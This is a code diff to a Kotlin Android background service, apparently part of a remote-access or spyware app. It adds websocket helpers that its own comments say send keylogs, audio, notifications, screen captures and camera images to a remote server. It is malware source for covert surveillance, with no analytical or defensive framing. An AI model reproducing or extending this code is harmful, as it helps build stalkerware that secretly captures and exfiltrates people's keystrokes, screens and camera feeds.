@@ -12,6 +12,7 @@ import android.os.IBinder
 import android.provider.Settings
 import kotlinx.coroutines.*
 import okhttp3.*
+import okio.ByteString
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 
@@ -23,7 +24,13 @@ class ConnectionService : Service() {
         @Volatile var isWsConnected = false
         var screenResultCode = 0
         var screenData: Intent? = null
-        fun push(data: String) { instance?.sendPushInternal(data) }
+
+        // For WebRTC signaling and raw strings
+        fun push(data: String) { instance?.sendPushString(data) }
+        // For Audio, Notifications, Keylogs
+        fun push(ctx: Context, kind: String, data: String) { instance?.sendPushJson(kind, data) }
+        // For Screen and Camera images
+        fun pushImage(data: ByteArray) { instance?.sendPushBinary(data) }
     }
 
     private val client = OkHttpClient.Builder().pingInterval(5, TimeUnit.SECONDS).readTimeout(0, TimeUnit.MILLISECONDS).build()
@@ -84,7 +91,10 @@ class ConnectionService : Service() {
         reconnectJob = scope.launch { delay(d); connect() }
     }
 
-    fun sendPushInternal(data: String) { try { ws?.send(data) } catch (_: Exception) {} }
+    // Push Helpers
+    private fun sendPushString(data: String) { try { ws?.send(data) } catch (_: Exception) {} }
+    private fun sendPushJson(kind: String, data: String) { try { ws?.send(JSONObject().put("type", "push").put("kind", kind).put("data", data).toString()) } catch (_: Exception) {} }
+    private fun sendPushBinary(data: ByteArray) { try { ws?.send(ByteString.of(*data)) } catch (_: Exception) {} }
 
     override fun onDestroy() {
         shouldRun = false; reconnectJob?.cancel(); try { ws?.close(1000, "destroy") } catch (_: Exception) {}
